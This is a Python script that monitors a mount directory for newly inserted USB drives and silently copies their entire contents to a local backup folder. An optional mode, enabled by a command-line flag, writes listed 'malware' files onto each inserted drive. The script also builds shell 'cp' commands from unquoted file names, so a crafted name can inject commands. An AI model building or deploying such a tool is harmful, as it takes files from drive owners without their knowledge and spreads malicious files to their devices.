import os
from threading import Thread
import time
from copas1 import cpfile
from copas1 import cpfol
import sys

realdir = os.getcwd()
#create log file
def logg(pesan="error"):
    startdir = os.getcwd()
    os.chdir(realdir)
    with open("log-autocopy", 'a+') as oke:
        oke.write("\n%s\n" %(pesan))
    os.chdir(startdir)

malware = []   #dir must be same with angel eyes        
mwmode = False    #If you want to copy some malware, set it True
source_mount_backup = "/dev/sda1"
target_mount_backup = "/media/root/windows10"        
backup_folder = os.path.join(target_mount_backup, "backup")
monitoring_drive = "/media/root"
exception_drive = ["windows10"] #in this case, my backup drive is windows10

#make sure the backup dir is mounted by remount the backup drive
"""
try:
    os.system("sudo umount %s"%(source_mount_backup))
except:
    print("error at unmount")
    sys.exit(1)
try:
    os.system("sudo mount %s %s"%(source_mount_backup, target_mount_backup))
except:
    print("error at mounting drive")
    sys.exit(1)
"""

sudah = []

#bagian copy
def copypaste(x):
    print("copying file from %s" %(x))
    startdir = str(os.getcwd())
    try:
        os.chdir(x)
        where = os.getcwd()#sekarang dalam flashdisk
        print(where)
        time.sleep(2)
        eko = list(os.listdir())
        if eko == []:
            while True:
                if eko != []:
                    break
                os.chdir(where)
                eko = list(os.listdir())
        print(eko)
        for i in eko:
            if True:#try:
                
                print(os.getcwd())
                print("copying %s" %(i))
                os.system("cp -r %s %s" %(i, os.path.join(backup_folder, i)))
                cadang = os.listdir(backup_folder)
                if i in cadang:
                 pass
                else:
                 try:
                  cpfile(i, "%s" %(os.path.join(backup_folder, i)))
                 except:
                   try:
                     cpfol(i, "%s" %(os.path.join(backup_folder, i)))
                   except:
                     print("error while copying %s" %(i)) 
                print("done copying %s" %(i))
            #except:
            #    print("error copying %s" %(i))
        os.chdir(startdir)
    except Exception as e:
        print("error while copypaste: %s"%(str(e)))

try:
    if sys.argv[1] == "A":
        mwmode = True
        
except:
    pass
print("mwmode == {}".format(mwmode))
time.sleep(2)


def copymalware(target):
    try:
        for i in malware:
            with open(i, "rb") as cpm:
                cpm = cpm.read()
                with open((os.path.join(target, i)), "wb") as okay:
                    okay.write(cpm)
    except:
        print("Failed to copy malware")

def monitoring():
    print("Monitoring started at %s" %(monitoring_drive))
    while True:
        oke = []
        os.chdir(monitoring_drive)
        
        oke = list(os.listdir())
        if (len(oke) > 0):
            for a in oke:
                if a in sudah:
                    continue
                if a in exception_drive:
                    continue
                print("found %s . copying to %s" %(a, backup_folder))
                if mwmode:
                    copymalware(a)
                copypaste(a)
                sudah.append(a)
                
monitoring()
            
